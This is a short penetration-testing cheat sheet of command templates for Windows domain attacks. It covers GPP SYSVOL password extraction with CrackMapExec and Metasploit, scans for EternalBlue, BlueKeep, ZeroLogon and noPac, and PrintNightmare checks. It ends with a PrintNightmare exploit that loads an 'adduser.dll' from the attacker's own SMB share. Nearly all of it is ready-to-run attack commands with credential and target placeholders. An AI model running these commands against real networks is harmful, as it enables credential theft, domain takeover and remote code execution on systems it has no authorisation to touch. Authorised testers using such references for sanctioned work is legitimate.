# CVE

## Check & Exploit GPP SYSVOL (MS14-025) - cme

```
cme smb <domain-controller> -u <user> -p <password> -d <domain> -M gpp_password
```

= domain-controller: $DC
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN

## Check & Exloit GPP SYSVOL (MS14-025) - msf

```
msfconsole -x "use scanner/smb/smb_enum_gpp;set RHOST <domain-controller>;set SMBDomain <domain>;set SMBUser <user>;set SMBPass <password>"
```

= domain-controller: $DC
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN

## Check SMB vulnerabilities - nmap

```
nmap -Pn --script smb-vuln* -p139,445 -iL <target>
```

= target: $TARGETS/computers.list

## Check Eternal Blue (MS17-010) - cme

```
cme smb <target> -M ms17
```

= target: $TARGETS/computers.list

## Check BlueKeep (CVE-2019-0708) - script

```
rdpscan <target>
```

= target: $TARGETS/computers.list

## Check Eternal Blue (MS17-010) - nmap

```
nmap -Pn --script smb-vuln-ms17-010 -p139,445 <target>
```

= target: $TARGETS/computers.list

## Check Zero Logon (CVE-2020-1472) - cme

```
cme smb <domain-controller> -M zerologon
```

= domain-controller: $DC

## Check noPac (CVE-2021-42278 and CVE-2021-42287) - cme

```
cme smb <domain-controller> -u <user> -p <password> -d <domain> -M nopac
```

= domain-controller: $DC
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN

## Check Print Nightmare with Docker (CVE-2021-34527) - docker

```
docker run -v "<target>:/target.txt"-it itwasalladream -u <user> -p <password> -d <domain> target.txt
```

= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
= target: $TARGETS/computers.list

## Check Print Nightmare with local install (CVE-2021-34527) - script

```
itwasalladream -u <user> -p <password> -d <domain> target.txt
```

= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
= target: $TARGETS/computers.list

## Exploit Print Nightmare (CVE-2021-34527) - script

```
CVE-2021-1675 <domain>/<user>:<password>@<target> '\\<my_ip>\public\adduser.dll'
```

= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
